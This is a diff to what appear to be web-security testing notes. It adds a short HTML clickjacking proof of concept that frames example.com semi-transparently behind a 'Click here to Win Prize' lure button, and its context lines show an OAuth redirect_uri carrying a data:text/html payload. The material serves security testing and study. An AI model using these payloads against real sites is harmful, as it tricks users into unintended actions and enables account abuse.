@@ -623,3 +623,16 @@ https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca
 * OAuth is not mean for authentication
 * OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication
 * it enables authentication on top of OAuth
+
+## CLick jacking test
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC</title>
+</head>
+<body>
+<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
+<iframe src="https://example.com" width=100% height=100% style=”opacity: 0.5;”></iframe>
+</body>
+</html>
